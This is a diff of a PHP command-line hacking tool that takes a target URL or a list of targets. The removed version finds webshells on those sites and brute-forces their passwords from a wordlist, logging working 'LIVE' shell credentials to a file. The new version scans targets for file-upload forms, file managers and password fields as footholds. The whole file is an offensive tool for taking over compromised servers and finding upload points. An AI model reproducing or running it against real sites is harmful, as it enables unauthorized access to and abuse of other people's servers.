@@ -3,8 +3,6 @@
 //"contactAuthor":"yus17726@gmail.com"
 //"facebookAuthor":"http://facebook.com/yus.127.0.0.1"
 
-error_reporting(E_ALL^(E_NOTICE));
-
 print "
              /\
             ( ;`~v/~~~ ;._
@@ -28,136 +26,59 @@ print "
 echo "Enter the target : ";
 $list = trim(fgets(STDIN));
 
-function crotz($x)
+function crotz($url)
 {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_setopt($ch, CURLOPT_URL, $x);
+    curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
     curl_setopt($ch, CURLOPT_HEADER, 1);
-    $output = curl_exec($ch);
+    $output = strtolower(curl_exec($ch));
     $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    preg_match("|type='password' name=\"(.*?)\"|", $output, $password1);
+    preg_match("|<input type='pass' name=\"(.*?)\"|", $output, $pass1);
+    preg_match("|type=\"password\" name=\"(.*?)\"|", $output, $password2);
+    preg_match("|<input type=\"pass\" name=\"(.*?)\"|", $output, $pass2);
+    preg_match("|File Manager|", $output, $fm);
+    preg_match("|<input type=\"file\" |", $output, $upload);
 
-    if($status == 200)
+    if($status == 200) 
     {
-        preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $password);
-        preg_match("|File Manager|", $output, $fm);
-        preg_match("|<input type=\"file\" |", $output, $upload);
-
-        if(!empty($password))
+        echo "\n[Notice] Status is ".$status;
+        echo "\n[Notice] Checking the form.";
+        
+        if(!empty($fm) || !empty($upload))
         {
-            $password = $password[1];
-            echo "\nFounded a webshell at ".$x."\nDo you want to login? [Y/n] [default = n (NO)] ";
-            $answer = trim(fgets(STDIN));
-
-            if(($answer == "y") || $answer == "Y")
-            {
-                unlink('cook.txt');
-                echo "Type your pass : ";
-                $pass = trim(fgets(STDIN));
-
-                if(strpos($pass, ".txt"))
-                {
-                    $open = fopen("$pass", "r");
-                    $size = filesize("$pass");
-                    $read = fread($open, $size);
-                    $passwd = explode("\n", $read);
-
-                    foreach($passwd as $key)
-                    {
-                        if(!empty($key))
-                        {
-                            curl_setopt($ch, CURLOPT_URL, $x);
-                            curl_setopt($ch, CURLOPT_HEADER, 0);
-                            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cook.txt');
-                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-                            curl_setopt($ch, CURLOPT_POST, true);
-                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                            curl_setopt($ch, CURLOPT_POSTFIELDS, "pass=".$key);
-                            $output = curl_exec($ch);
-                            preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $pswd);
-
-                            if(!empty($pswd))
-                            {
-                                $end = fopen("shell_die.txt", "a+");
-                                fwrite($end, "\n[DIE] Shell at ".$x." password : ".$key);
-                                print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
-                                fclose($end);
-                            } else if(empty($pswd))
-                            {
-                                $end = fopen("shell_result.txt", "a+");
-                                fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$key);
-                                print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$key."\n\n";
-                                fclose($end);
-                            }
-                        }
-                    }
-                } else if(!strpos($pass, ".txt"))
-                {
-                    curl_setopt($ch, CURLOPT_URL, $x);
-                    curl_setopt($ch, CURLOPT_HEADER, 0);
-                    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cook.txt');
-                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-                    curl_setopt($ch, CURLOPT_POST, true);
-                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-                    curl_setopt($ch, CURLOPT_POSTFIELDS, "pass=".$pass);
-                    $output = curl_exec($ch);
-                    preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $pswd);
-
-                    if(!empty($pswd))
-                    {
-                        $end = fopen("shell_die.txt", "a+");
-                        fwrite($end, "\n[DIE] Shell at ".$x." password : ".$pass);
-                        print "\n[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
-                        fclose($end);
-                    } else if(empty($pswd))
-                    {
-                        $end = fopen("shell_result.txt", "a+");
-                        fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$pass);
-                        print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$pass."\n\n";
-                        fclose($end);
-                    }
-                }
-            }
+            echo "\n[GOOD] Looks like this site have an upload form.";
         }
-    } else if(!empty($status) && $status != 200)
+        else if(!empty($password1) || !empty($pass1) || !empty($password2) || !empty($pass2))
+        {
+            echo "\n[GOOD] Looks like this site have a password form.";
+        }
+        else
+        {
+            echo "\n[WARNING] Sorry, there is nothing to do.";
+        }
+    }
+    else 
     {
-        echo "[DIE] Sorry, but the shell at ".$x." isn't found\n";
+        echo "\n[BAD] Sorry, status is ".$status.".";
     }
 }
 
-if(strpos($list, ".txt")) 
+function splitz($list, $curling = 'N')
 {
-    $open = fopen("$list", "r");
-    $size = filesize("$list");
+    $open = fopen($list, "r");
+    $size = filesize($list);
     $read = fread($open, $size);
-    $url = explode("\n", $read);
+    $url  = explode("\n", $read);
 
-    foreach($url as $host)
-    {
+    foreach($url as $host):
         crotz($host);
-    }
-} else if(strpos($list, ".txt") && strpost($list, "|"))
-{
-    $explode = explode("|", $list);
-
-    foreach($explode as $lists)
-    {
-        $open = fopen("$lists", "r");
-        $size = filesize("$lists");
-        $read = fread($open, $size);
-        $url = explode("\n", $read);
-
-        foreach($url as $host)
-        {
-                crotz($host);
-        }
-    }
-} else
-{
-    crotz($list);
+    endforeach;
 }
 
+(strpos($list, ".txt")) ? splitz($list) : crotz($list);
 ?>
